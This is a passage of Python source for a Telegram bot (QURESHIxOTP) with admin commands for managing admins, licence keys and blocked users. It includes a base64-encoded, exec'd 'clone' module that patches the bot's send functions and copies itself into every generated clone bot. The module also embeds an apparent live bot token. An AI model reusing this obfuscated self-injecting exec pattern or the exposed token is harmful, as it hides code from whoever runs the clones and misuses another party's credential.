        txt = f"🟢 <b>AUTO-DELETE ON — {_gad_fmt(ttl)}</b>\n➜ Iske baad ke group messages {_gad_fmt(ttl)} me khud delete"
    await event.edit(premium_emoji(txt), buttons=[
        [Button.inline("ᴀᴜᴛᴏ ᴅᴇʟᴇᴛᴇ", b"adm_autodel", style="primary")],
        [Button.inline("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", b"admin_panel", style="primary")],
    ], parse_mode="html")

# Catch the admin's next plain message in private chat to fulfil pending actions
@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id in _admin_pending and not e.message.text.startswith("/")))
async def admin_pending_catch(event):
    pending = _admin_pending.pop(event.sender_id)
    ptype = pending["type"]
    chat_id = event.chat_id
    text = (event.message.text or "").strip()
    if not text:
        await event.reply(premium_emoji("❌ ᴇᴍᴘᴛʏ ɪɴᴘᴜᴛ"), parse_mode="html"); return
    try:
        if "ᴀᴅᴅ ᴀᴅᴍɪɴ" in ptype:
            try:
                tid = int(text)
            except ValueError:
                await event.reply(premium_emoji("❌ <b>Invalid ID — sirf numeric user ID bhejo</b>"), parse_mode="html"); return
            if tid == ADMIN_ID:
                await event.reply(premium_emoji("⚠️ <b>Owner already full access he 👑</b>"), parse_mode="html"); return
            if tid in KEY_ADMINS:
                await event.reply(premium_emoji(f"⚠️ <b><code>{tid}</code> already admin he</b>"), parse_mode="html"); return
            KEY_ADMINS.add(tid)
            _save_admins()
            try:
                if is_blocked(tid):
                    unblock_user(tid)
            except Exception:
                pass
            await event.reply(premium_emoji(f"<b>👑 New Admin Added ✅</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <a href='tg://user?id={tid}'>Admin</a> — <code>{tid}</code>\n━━━━━━━━━━━━━━━━━━━━\n<b>Ab wo /admin se panel open kar sakta he</b>"), parse_mode="html")
            try:
                await bot.send_message(tid, premium_emoji("<b>👑 Congrats — ab aap QURESHIxOTP ke ADMIN ho!</b>\n➜ /admin type karke panel open karo"), parse_mode="html")
            except Exception:
                pass  # user ne bot ko /start nahi kiya hoga — koi baat nahi
        elif "ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ" in ptype:
            try:
                tid = int(text)
            except ValueError:
                await event.reply(premium_emoji("❌ <b>Invalid ID — sirf numeric user ID bhejo</b>"), parse_mode="html"); return
            if tid == ADMIN_ID:
                await event.reply(premium_emoji("⛔ <b>Owner ko remove nahi kar sakte!</b>"), parse_mode="html"); return
            if tid not in KEY_ADMINS:
                await event.reply(premium_emoji(f"⚠️ <b><code>{tid}</code> admin list me nahi he</b>"), parse_mode="html"); return
            KEY_ADMINS.discard(tid)
            _save_admins()
            await event.reply(premium_emoji(f"<b>✅ Admin Removed — <code>{tid}</code></b>\n\n👑 Active admins list check karo"), parse_mode="html")
        if "ɢᴇɴ ᴋᴇʏ" in ptype:
            parts = text.split()
            if len(parts) != 3:
                await event.reply(premium_emoji("❌ ᴜsᴀɢᴇ: <code>COUNT DAYS DEVICE_LIMIT</code>"), parse_mode="html"); return
            count, days, dev = int(parts[0]), int(parts[1]), int(parts[2])
            if count < 1 or days < 1 or dev < 1:
                await event.reply(premium_emoji("❌ COUNT, DAYS aur DEVICE_LIMIT sab 1 ya us se zyada hone chahiye."), parse_mode="html"); return
            ok, limit_msg = _reserve_admin_key_quota(event.sender_id, count, days)
            if not ok:
                await event.reply(premium_emoji(limit_msg), parse_mode="html"); return
            keys = []
            for _ in range(count):
                keys.append(generate_multi_device_key(days, dev))
            ts = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
            fn = f"Keys_{ts}.txt"
            with open(fn, "w", encoding="utf-8") as f:
                f.write("⭐ KEYS GENERATED ⭐\n" + "="*30 + "\n")
                f.write(f"Duration: {days}h\nMax Users: {dev}\nQuantity: {count}\n" + "="*30 + "\n\n")
                for i, k in enumerate(keys, 1):
                    f.write(f"{i}. {k}\n")
            msg = f"<b>🔑 ɢᴇɴᴇʀᴀᴛᴇᴅ {count} ᴋᴇʏ(s) ✅</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            for i, k in enumerate(keys, 1):
                msg += f"{i}. <code>{k}</code>\n"
            msg += "━━━━━━━━━━━━━━━━━━━━\nʀᴇᴅᴇᴇᴍ: <code>/redeem [key]</code>"
            await bot.send_message(chat_id, premium_emoji(msg), file=fn, parse_mode="html")
            try: os.remove(fn)
            except Exception: pass
        elif "ʀᴇᴅᴇᴇᴍ" in ptype:
            key = text
            status = redeem_multi_device_key(key, event.sender_id)
            status_map = {
                "success": "✅ <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍᴇᴅ!</b>\nʏᴏᴜ'ʀᴇ ɴᴏᴡ ᴘʀᴇᴍɪᴜᴍ 💎",
                "invalid": "❌ ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ ᴋᴇʏ",
                "used": "⚠️ ᴛʜɪs ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ʙʏ ʏᴏᴜ",
                "already_premium": "⚠️ ʏᴏᴜ'ʀᴇ ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ/ᴀᴅᴍɪɴ",
                "device_limit_reached": "❌ ᴋᴇʏ ᴅᴇᴠɪᴄᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ",
            }
            await event.reply(premium_emoji(status_map.get(status, f"❌ {status}")), parse_mode="html")
        elif "ᴋᴇʏ sᴛᴀᴛs" in ptype:
            info = get_key_info(text)
            if not info:
                await event.reply(premium_emoji("❌ ᴋᴇʏ ɴᴏᴛ ғᴏᴜɴᴅ"), parse_mode="html"); return
            used = info.get("used", 0); lim = info.get("limit", 0); days = info.get("days", 0)
            created = info.get("created", "?"); users_list = info.get("users", [])
            prog = "🟢"*used + "⚪"*max(0, lim-used)
            ut = "\n".join(f"<code>{u}</code>" for u in users_list) if users_list else "ɴᴏ ᴜsᴇʀs"
            m = (f"<b>📈 ᴋᴇʏ sᴛᴀᴛs</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                 f"🔑 <b>ᴋᴇʏ:</b> <code>{text[:20]}...</code>\n"
                 f"💎 <b>ᴘʟᴀɴ:</b> {days} ᴅᴀʏs\n"
                 f"📱 <b>ᴅᴇᴠɪᴄᴇs:</b> {used}/{lim}\n"
                 f"📊 <b>ᴘʀᴏɢʀᴇss:</b> {prog}\n"
                 f"📅 <b>ᴄʀᴇᴀᴛᴇᴅ:</b> {created}\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n{ut}")
            await event.reply(premium_emoji(m), parse_mode="html")
        elif "ʙʟᴏᴄᴋ" in ptype and "ᴜɴʙʟᴏᴄᴋ" not in ptype:
            # 🔧 FIX: numeric ID ya @username dono — invalid pe sahi error (pehle crash hota tha)
            tid = None
            _bt = text.strip().lstrip("@")
            if _bt.isdigit():
                tid = int(_bt)
            else:
                try:
                    _be = await bot.get_entity(text.strip())
                    tid = getattr(_be, "id", None)
                except Exception:
                    tid = None
            if tid is None:
                await event.reply(premium_emoji("❌ <b>Invalid — numeric USER ID ya @username bhejo</b>"), parse_mode="html"); return
            if tid in KEY_ADMINS or tid == ADMIN_ID:
                await event.reply(premium_emoji("❌ <b>Can't block ADMIN / OWNER</b>"), parse_mode="html"); return
            try:
                block_user(tid)
                await event.reply(premium_emoji(f"🚫 ʙʟᴏᴄᴋᴇᴅ <code>{tid}</code> ✅"), parse_mode="html")
            except Exception as e:
                await event.reply(premium_emoji(f"❌ {str(e)[:50]}"), parse_mode="html")
        
        elif "ᴜɴʙʟᴏᴄᴋ" in ptype:
            # 🔧 FIX: ID/username dono + unblock_user() se safe removal
            tid = None
            _ut = text.strip().lstrip("@")
            if _ut.isdigit():
                tid = int(_ut)
            else:
                try:
                    _ue = await bot.get_entity(text.strip())
                    tid = getattr(_ue, "id", None)
                except Exception:
                    tid = None
            try:
                if tid is not None:
                    unblock_user(tid)
                    await event.reply(premium_emoji(f"✅ ᴜɴʙʟᴏᴄᴋᴇᴅ <code>{tid}</code>"), parse_mode="html")
                else:
                    _ul = text.strip()
                    with open(BLOCK_FILE, "r") as f:
                        _lines = [l.strip() for l in f if l.strip() and l.strip() != _ul]
                    with open(BLOCK_FILE, "w") as f:
                        f.write("\n".join(_lines) + ("\n" if _lines else ""))
                    await event.reply(premium_emoji(f"✅ ᴜɴʙʟᴏᴄᴋᴇᴅ <code>{_ul}</code>"), parse_mode="html")
            except Exception as e:
                await event.reply(premium_emoji(f"❌ {str(e)[:50]}"), parse_mode="html")
    
    except Exception as e:
        await event.reply(premium_emoji(f"❌ ᴇʀʀᴏʀ: {str(e)[:60]}"), parse_mode="html")

# ==================== 🧬 CLONE BOT SYSTEM (USER PANEL + APPROVAL GROUP) ====================
# User-panel clone wizard (premium/non-premium template patch) + approval-group flow
# + free-24h / premium-expiry monitor + self-replicating clones (clone-of-clone support).
# ==== CLONE SYSTEM (AUTO) ====
import base64 as _clz_b64x
CLONE_MODULE_B64 = 'IyA9PT09PT09PT09PT09PT09PT0gQ0xPTkUgQk9UIFNZU1RFTSAoYXV0by1tb2R1bGUpID09PT09PT09PT09PT09PT09PQojIFVzZXItcGFuZWwgY2xvbmUgd2l6YXJkICsgcHJlbWl1bS9ub24tcHJlbWl1bSB0ZW1wbGF0ZSBwYXRjaGVyICsKIyBhcHByb3ZhbC1ncm91cCBmbG93IChBcHByb3ZlL1JlamVjdCkgKyBmcmVlLTI0aC9wcmVtaXVtIGV4cGlyeSBtb25pdG9yLgojIFllIG1vZHVsZSBtYWluIGJvdCBtZSBleGVjIGhvdGEgaGUgQU5EIGdlbmVyYXRlZCBjbG9uZXMgbWUgaW5qZWN0IGhvdGEgaGUuCgppbXBvcnQgc3lzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBiYXNlNjQKCl9DTFpfTUFSS0VSID0geyJraW5kIjogIm1haW4iLCAiY2gxIjogImZyZWVzY3JpcHRodWIiLCAibDIiOiAiaHR0cHM6Ly90Lm1lL3ByZW1pdW1zY3JpcHRzYmFja3VwIiwgImwzIjogImh0dHBzOi8vdC5tZS9RVVJFU0hJeE1PRFp2MSIsICJhZG1pbiI6IDAsICJ0b2tlbiI6ICIiLCAic2VzcyI6ICJjaGVja2VyX2JvdCIsICJnZW4iOiAwfQoKQ0xaX0FQUFJPVkFMX0xJTksgPSAiaHR0cHM6Ly90Lm1lLytLcTRVTzJUbWZKczJNRFJsIgpDTFpfRlJFRV9IT1VSUyA9IDI0CkNMWl9GUkVFX01BWCA9IDEKQ0xaX1BSRU1fTUFYID0gMwpDTFpfRElSID0gImNsb25lX2ZpbGVzIgpDTFpfVFBMX1BSRU0gPSAicHJlbWl1bS0ucHkiCkNMWl9UUExfTlAgPSAibm9uLXByZW1pdW0ucHkiCgpfY2x6X3dpeiA9IHt9CgpkZWYgX2Nsel9yb290KCk6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gb3MuZ2V0Y3dkKCkKCmRlZiBfY2x6X3AobmFtZSk6CiAgICByZXR1cm4gb3MucGF0aC5qb2luKF9jbHpfcm9vdCgpLCBuYW1lKQoKZGVmIF9jbHpfZGF0YV9maWxlKCk6CiAgICByZXR1cm4gImNsb25lX2JvdHNfJXMuanNvbiIgJSAoX0NMWl9NQVJLRVIuZ2V0KCJzZXNzIikgb3IgIm1haW4iKQoKZGVmIF9jbHpfY2ZnX2ZpbGUoKToKICAgIHJldHVybiAiY2xvbmVfY2ZnXyVzLmpzb24iICUgKF9DTFpfTUFSS0VSLmdldCgic2VzcyIpIG9yICJtYWluIikKCmRlZiBfY2x6X2xvYWQoKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oX2Nsel9wKF9jbHpfZGF0YV9maWxlKCkpLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIHJldHVybiBqc29uLmxvYWQoZikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIHt9CgpkZWYgX2Nsel9zYXZlKGQpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihfY2x6X3AoX2Nsel9kYXRhX2ZpbGUoKSksICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAganNvbi5kdW1wKGQsIGYsIGluZGVudD0xKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJbQ0xaXSBkYXRhIHNhdmUgZmFpbDoiLCBlKQoKZGVmIF9jbHpfY2ZnKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKF9jbHpfcChfY2x6X2NmZ19maWxlKCkpLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIHJldHVybiBqc29uLmxvYWQoZikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIHt9CgpkZWYgX2Nsel9jZmdfc2F2ZShjKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oX2Nsel9wKF9jbHpfY2ZnX2ZpbGUoKSksICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAganNvbi5kdW1wKGMsIGYpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKCmRlZiBfY2x6X2NvdW50cyh1aWQpOgogICAgZCA9IF9jbHpfbG9hZCgpCiAgICBsc3QgPSBkLmdldChzdHIodWlkKSwgW10pCiAgICByZXR1cm4gbGVuKFtlIGZvciBlIGluIGxzdCBpZiBlLmdldCgic3RhdHVzIikgaW4gKCJwZW5kaW5nX2dyb3VwIiwgInBlbmRpbmdfYXBwcm92YWwiLCAiYWN0aXZlIiwgImFza2VkIildKQoKZGVmIF9jbHpfbW9kX3NyYyhtYXJrZXIpOgogICAgc3JjID0gYmFzZTY0LmI2NGRlY29kZShnbG9iYWxzKClbIkNMT05FX01PRFVMRV9CNjQiXSkuZGVjb2RlKCJ1dGYtOCIpCiAgICBsaW5lID0gIl9DTFpfTUFSS0VSID0gIiArIGpzb24uZHVtcHMobWFya2VyKQogICAgcmV0dXJuIHJlLnN1YihyIl5fQ0xaX01BUktFUiA9IC4qJCIsIGxhbWJkYSBtOiBsaW5lLCBzcmMsIGNvdW50PTEsIGZsYWdzPXJlLk0pCgpkZWYgX2Nsel9iNjRtb2QobWFya2VyKToKICAgIHJldHVybiBiYXNlNjQuYjY0ZW5jb2RlKF9jbHpfbW9kX3NyYyhtYXJrZXIpLmVuY29kZSgidXRmLTgiKSkuZGVjb2RlKCJhc2NpaSIpCgpkZWYgX2Nsel9zZigpOgogICAgcmV0dXJuIGdsb2JhbHMoKS5nZXQoIl9vcmlnX3NlbmRfZmlsZSIpIG9yIGJvdC5zZW5kX2ZpbGUKCmRlZiBfY2x6X3NtKCk6CiAgICByZXR1cm4gZ2xvYmFscygpLmdldCgiX29yaWdfc2VuZF9tZXNzYWdlIikgb3IgYm90LnNlbmRfbWVzc2FnZQoKIyAtLS0tLS0tLS0tIFNUQVJULU1FTlUgQlVUVE9OIElOSkVDVElPTiAoc2FiIHRlbXBsYXRlcyBtZSB1bmlmb3JtKSAtLS0tLS0tLS0tCgpkZWYgX2Nsel9idG5yb3coKToKICAgIHJldHVybiBCdXR0b24uaW5saW5lKCJcVTAwMDFGOUVDIFx1MWQwNFx1MDI5Zlx1MWQwZlx1MDI3NFx1MWQwNyBcdTFkMjJcdTFkMGZcdTFkMWIiLCBiImNsb25lX2JvdF9tZW51Iiwgc3R5bGU9InByaW1hcnkiLCBpY29uPXJiX2ljb24oKSkKCmRlZiBfY2x6X21haW5tZW51KGJ1dHRvbnMpOgogICAgdHJ5OgogICAgICAgIGZsYXQgPSBbXQogICAgICAgIGZvciByb3cgaW4gKGJ1dHRvbnMgb3IgW10pOgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHJvdywgKGxpc3QsIHR1cGxlKSk6CiAgICAgICAgICAgICAgICBmbGF0LmV4dGVuZChyb3cpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBmbGF0LmFwcGVuZChyb3cpCiAgICAgICAgZHMgPSBzZXQoKQogICAgICAgIGZvciBiIGluIGZsYXQ6CiAgICAgICAgICAgIGQgPSBnZXRhdHRyKGIsICJkYXRhIiwgTm9uZSkKICAgICAgICAgICAgaWYgZDoKICAgICAgICAgICAgICAgIGRzLmFkZChieXRlcyhkKSkKICAgICAgICByZXR1cm4gYiJjaGVja2VyIiBpbiBkcyBhbmQgYiJidXkiIGluIGRzCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIF9jbHpfaW5qZWN0KGJ1dHRvbnMpOgogICAgdHJ5OgogICAgICAgIGlmIG5vdCBfY2x6X21haW5tZW51KGJ1dHRvbnMpOgogICAgICAgICAgICByZXR1cm4gYnV0dG9ucwogICAgICAgIHJvd3MgPSBbXQogICAgICAgIGZvciByIGluIChidXR0b25zIG9yIFtdKToKICAgICAgICAgICAgcm93cy5hcHBlbmQobGlzdChyKSBpZiBpc2luc3RhbmNlKHIsIChsaXN0LCB0dXBsZSkpIGVsc2UgW3JdKQogICAgICAgIHJvd3MuYXBwZW5kKFtfY2x6X2J0bnJvdygpXSkKICAgICAgICByZXR1cm4gcm93cwogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gYnV0dG9ucwoKX2Nsel9vX3NmID0gYm90LnNlbmRfZmlsZQpfY2x6X29fc20gPSBib3Quc2VuZF9tZXNzYWdlCnRyeToKICAgIF9jbHpfb19lbSA9IGJvdC5lZGl0X21lc3NhZ2UKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIF9jbHpfb19lbSA9IE5vbmUKCmFzeW5jIGRlZiBfY2x6X3dfc2YoKmEsICoqa3cpOgogICAgdHJ5OgogICAgICAgIGlmICJidXR0b25zIiBpbiBrdzoKICAgICAgICAgICAga3dbImJ1dHRvbnMiXSA9IF9jbHpfaW5qZWN0KGt3WyJidXR0b25zIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKICAgIHJldHVybiBhd2FpdCBfY2x6X29fc2YoKmEsICoqa3cpCgphc3luYyBkZWYgX2Nsel93X3NtKCphLCAqKmt3KToKICAgIHRyeToKICAgICAgICBpZiAiYnV0dG9ucyIgaW4ga3c6CiAgICAgICAgICAgIGt3WyJidXR0b25zIl0gPSBfY2x6X2luamVjdChrd1siYnV0dG9ucyJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCiAgICByZXR1cm4gYXdhaXQgX2Nsel9vX3NtKCphLCAqKmt3KQoKYXN5bmMgZGVmIF9jbHpfd19lbSgqYSwgKiprdyk6CiAgICB0cnk6CiAgICAgICAgaWYgImJ1dHRvbnMiIGluIGt3OgogICAgICAgICAgICBrd1siYnV0dG9ucyJdID0gX2Nsel9pbmplY3Qoa3dbImJ1dHRvbnMiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgcmV0dXJuIGF3YWl0IF9jbHpfb19lbSgqYSwgKiprdykKCmJvdC5zZW5kX2ZpbGUgPSBfY2x6X3dfc2YKYm90LnNlbmRfbWVzc2FnZSA9IF9jbHpfd19zbQppZiBfY2x6X29fZW06CiAgICBib3QuZWRpdF9tZXNzYWdlID0gX2Nsel93X2VtCgojIC0tLS0tLS0tLS0gVEVNUExBVEUgUEFUQ0hFUlMgLS0tLS0tLS0tLQoKZGVmIF9jbHpfdHBsX3NyYyhraW5kKToKICAgICMgcHJlbWl1bTogc2lyZiBtYWluIGJvdCBrZSBwYWFzIHByZW1pdW0tLnB5IHRlbXBsYXRlIGZpbGUgaGUuCiAgICAjIG5vbi1wcmVtaXVtOiBQTEFJTiBzb3VyY2UgPSBraHVkIGtpIGZpbGUgKG1haW4gYm90IGZpbGUgLyBjbG9uZSBmaWxlKSDigJQKICAgICMgbm9uLXByZW1pdW0ucHkgYmxvYiBlbmNvZGVkIGhlLCBpc2xpeWUgcGxhaW4gc291cmNlIGhpIHVzZSBob3RhIGhlLgogICAgaWYgX0NMWl9NQVJLRVIuZ2V0KCJraW5kIikgPT0gIm1haW4iIGFuZCBraW5kID09ICJwcmVtaXVtIjoKICAgICAgICB3aXRoIG9wZW4oX2Nsel9wKENMWl9UUExfUFJFTSksICJyIiwgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSJzdXJyb2dhdGVlc2NhcGUiKSBhcyBmOgogICAgICAgICAgICByZXR1cm4gZi5yZWFkKCkKICAgIHdpdGggb3Blbihvcy5wYXRoLmFic3BhdGgoX19maWxlX18pLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0ic3Vycm9nYXRlZXNjYXBlIikgYXMgZjoKICAgICAgICByZXR1cm4gZi5yZWFkKCkKCmRlZiBfY2x6X3BhdGNoX3ByZW1pdW0odHBsLCB0b2tlbiwgYWRtaW4sIGNoMSwgbDIsIGwzLCBtYXJrZXIpOgogICAgbSA9IF9DTFpfTUFSS0VSCiAgICBvbGRfbDIgPSBtLmdldCgibDIiKSBvciAiaHR0cHM6Ly90Lm1lL3ByZW1pdW1zY3JpcHRzYmFja3VwIgogICAgb2xkX2wzID0gbS5nZXQoImwzIikgb3IgImh0dHBzOi8vdC5tZS9RVVJFU0hJeE1PRFp2MSIKICAgIG9sZF9zZXNzID0gbS5nZXQoInNlc3MiKSBvciAiY2hlY2tlcl9ib3QiCiAgICBzcmMgPSB0cGwKICAgIHNyYyA9IHJlLnN1YihyIkJPVF9UT0tFTlxzKj1ccypbJ1wiXVteJ1wiXStbJ1wiXSIsICJCT1RfVE9LRU4gPSAnJXMnIiAlIHRva2VuLCBzcmMsIGNvdW50PTEpCiAgICBzcmMgPSByZS5zdWIociJBRE1JTl9JRFxzKj1ccypcZCsiLCAiQURNSU5fSUQgPSAlZCIgJSBhZG1pbiwgc3JjLCBjb3VudD0xKQogICAgc3JjID0gcmUuc3ViKHIiS0VZX0FETUlOU1xzKj1ccypce1tefV0qXH0iLCAiS0VZX0FETUlOUyA9IHslZH0iICUgYWRtaW4sIHNyYywgY291bnQ9MSkKICAgIHNyYyA9IHJlLnN1YihyIkNIQU5ORUxfVVNFUk5BTUVccyo9XHMqW1wiJ11bXlwiJ10rW1wiJ10iLCAnQ0hBTk5FTF9VU0VSTkFNRSA9ICIlcyInICUgY2gxLCBzcmMsIGNvdW50PTEpCiAgICAjIHNpbmdsZS1wYXNzIGNhc2NhZGUtcHJvb2YgcmVwbGFjZSAobDIvbDMgZWsgc2FhdGgg4oCUIGN5Y2xpYyB2YWx1ZXMgc2FmZSkKICAgIHNyYyA9IF9jbHpfbXBfbWtyZXAoWyhvbGRfbDIsIGwyKSwgKG9sZF9sMywgbDMpXSkoc3JjKQogICAgc3JjID0gcmUuc3ViKHIidGc6Ly91c2VyXD9pZD1cZCsiLCAidGc6Ly91c2VyP2lkPSVkIiAlIGFkbWluLCBzcmMpCiAgICBzcmMgPSByZS5zdWIociJUZWxlZ3JhbUNsaWVudFwoXHMqWydcIl0iICsgcmUuZXNjYXBlKG9sZF9zZXNzKSArIHIiWydcIl0iLCAiVGVsZWdyYW1DbGllbnQoJyVzJyIgJSBtYXJrZXJbInNlc3MiXSwgc3JjLCBjb3VudD0xKQogICAgc3JjID0gcmUuc3ViKHIiIyA9PT09IENMT05FIFNZU1RFTSBcKEFVVE9cKSA9PT09Lio/IyA9PT09IEVORCBDTE9ORSBTWVNURU0gXChBVVRPXCkgPT09PSIsICIiLCBzcmMsIGZsYWdzPXJlLlMpCiAgICBibGsgPSAoIlxuIyA9PT09IENMT05FIFNZU1RFTSAoQVVUTykgPT09PVxuIgogICAgICAgICAgICJpbXBvcnQgYmFzZTY0IGFzIF9jbHpfYjY0eFxuIgogICAgICAgICAgICJDTE9ORV9NT0RVTEVfQjY0ID0gJXJcbiIKICAgICAgICAgICAiZXhlYyhfY2x6X2I2NHguYjY0ZGVjb2RlKENMT05FX01PRFVMRV9CNjQpLmRlY29kZSgndXRmLTgnKSwgZ2xvYmFscygpKVxuIgogICAgICAgICAgICIjID09PT0gRU5EIENMT05FIFNZU1RFTSAoQVVUTykgPT09PVxuXG4iKSAlIF9jbHpfYjY0bW9kKG1hcmtlcikKICAgIGkgPSBzcmMuZmluZCgnaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjonKQogICAgaWYgaSA8IDA6CiAgICAgICAgaSA9IGxlbihzcmMpCiAgICByZXR1cm4gc3JjWzppXSArIGJsayArIHNyY1tpOl0KCmRlZiBfY2x6X3BhdGNoX25wX3BsYWluKHRwbCwgdG9rZW4sIGFkbWluLCBjaDEsIGwyLCBsMywgbWFya2VyKToKICAgICMgTlAgY2xvbmUgPSBQTEFJTiByZWFkYWJsZSBmaWxlIOKAlCBwcmVtaXVtIGZsb3cgamFpc2EgU0lSRiByZWdleCByZXBsYWNlLgogICAgIyAocHVyYW5hIG1hcnNoYWwtYmxvYiBwYXRjaGVyIHNpcmYgbGVnYWN5IGVuY29kZWQgZmlsZXMga2UgbGl5ZSBmYWxsYmFjaykKICAgIGlmICJfID0gbGFtYmRhIiBpbiB0cGxbOjMwMDAwMF0gYW5kICJtYXJzaGFsIiBpbiB0cGxbOjMwMDAwMF06CiAgICAgICAgcmV0dXJuIF9jbHpfcGF0Y2hfbnAodHBsLCB0b2tlbiwgYWRtaW4sIGNoMSwgbDIsIGwzLCBtYXJrZXIpCiAgICBtID0gX0NMWl9NQVJLRVIKICAgIG9sZF9sMiA9IG0uZ2V0KCJsMiIpIG9yICJodHRwczovL3QubWUvcHJlbWl1bXNjcmlwdHNiYWNrdXAiCiAgICBvbGRfbDMgPSBtLmdldCgibDMiKSBvciAiaHR0cHM6Ly90Lm1lL1FVUkVTSEl4TU9EWnYxIgogICAgb2xkX3Nlc3MgPSBtLmdldCgic2VzcyIpIG9yICJjaGVja2VyX2JvdCIKICAgIHNyYyA9IHRwbAogICAgc3JjID0gcmUuc3ViKHIiQk9UX1RPS0VOXHMqPVxzKlsnXCJdW14nXCJdK1snXCJdIiwgIkJPVF9UT0tFTiA9ICclcyciICUgdG9rZW4sIHNyYywgY291bnQ9MSkKICAgIHNyYyA9IHJlLnN1YihyIkFETUlOX0lEXHMqPVxzKlxkKyIsICJBRE1JTl9JRCA9ICVkIiAlIGFkbWluLCBzcmMsIGNvdW50PTEpCiAgICBzcmMgPSByZS5zdWIociJLRVlfQURNSU5TXHMqPVxzKlx7W159XSpcfSIsICJLRVlfQURNSU5TID0geyVkfSIgJSBhZG1pbiwgc3JjLCBjb3VudD0xKQogICAgc3JjID0gcmUuc3ViKHIiQ0hBTk5FTF9VU0VSTkFNRVxzKj1ccypbXCInXVteXCInXStbXCInXSIsICdDSEFOTkVMX1VTRVJOQU1FID0gIiVzIicgJSBjaDEsIHNyYywgY291bnQ9MSkKICAgIHNyYyA9IF9jbHpfbXBfbWtyZXAoWyhvbGRfbDIsIGwyKSwgKG9sZF9sMywgbDMpXSkoc3JjKQogICAgc3JjID0gcmUuc3ViKHIidGc6Ly91c2VyXD9pZD1cZCsiLCAidGc6Ly91c2VyP2lkPSVkIiAlIGFkbWluLCBzcmMpCiAgICBzcmMgPSByZS5zdWIociJUZWxlZ3JhbUNsaWVudFwoXHMqWydcIl0iICsgcmUuZXNjYXBlKG9sZF9zZXNzKSArIHIiWydcIl0iLCAiVGVsZWdyYW1DbGllbnQoJyVzJyIgJSBtYXJrZXJbInNlc3MiXSwgc3JjLCBjb3VudD0xKQogICAgc3JjID0gcmUuc3ViKHIiIyA9PT09IENMT05FIFNZU1RFTSBcKEFVVE9cKSA9PT09Lio/IyA9PT09IEVORCBDTE9ORSBTWVNURU0gXChBVVRPXCkgPT09PSIsICIiLCBzcmMsIGZsYWdzPXJlLlMpCiAgICBibGsgPSAoIlxuIyA9PT09IENMT05FIFNZU1RFTSAoQVVUTykgPT09PVxuIgogICAgICAgICAgICJpbXBvcnQgYmFzZTY0IGFzIF9jbHpfYjY0eFxuIgogICAgICAgICAgICJDTE9ORV9NT0RVTEVfQjY0ID0gJXJcbiIKICAgICAgICAgICAiZXhlYyhfY2x6X2I2NHguYjY0ZGVjb2RlKENMT05FX01PRFVMRV9CNjQpLmRlY29kZSgndXRmLTgnKSwgZ2xvYmFscygpKVxuIgogICAgICAgICAgICIjID09PT0gRU5EIENMT05FIFNZU1RFTSAoQVVUTykgPT09PVxuXG4iKSAlIF9jbHpfYjY0bW9kKG1hcmtlcikKICAgIGkgPSBzcmMuZmluZCgnaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjonKQogICAgaWYgaSA8IDA6CiAgICAgICAgaSA9IGxlbihzcmMpCiAgICByZXR1cm4gc3JjWzppXSArIGJsayArIHNyY1tpOl0KCl9DTFpfTlBfT1JJRyA9IHsKICAgICJ0b2tlbiI6ICI4OTIzNTE5NzExOkFBRkd1Vi1tdkQxXzZIbVA1WERpUUtWQTFwNXE5RE1DQWFnIiwKICAgICJsMiI6ICJodHRwczovL3QubWUvcHJlbWl1bXNjcmlwdHNiYWNrdXAiLAogICAgImwzIjogImh0dHBzOi8vdC5tZS9RVVJFU0hJeE1PRFp2MSIsCiAgICAiY2gxIjogImZyZWVzY3JpcHRodWIiLAogICAgInNlc3MiOiAiY2hlY2tlcl9ib3QiLAogICAgImFkbWlucyI6IFs2NjUyOTc1MjIzXSwKfQoKIyAtL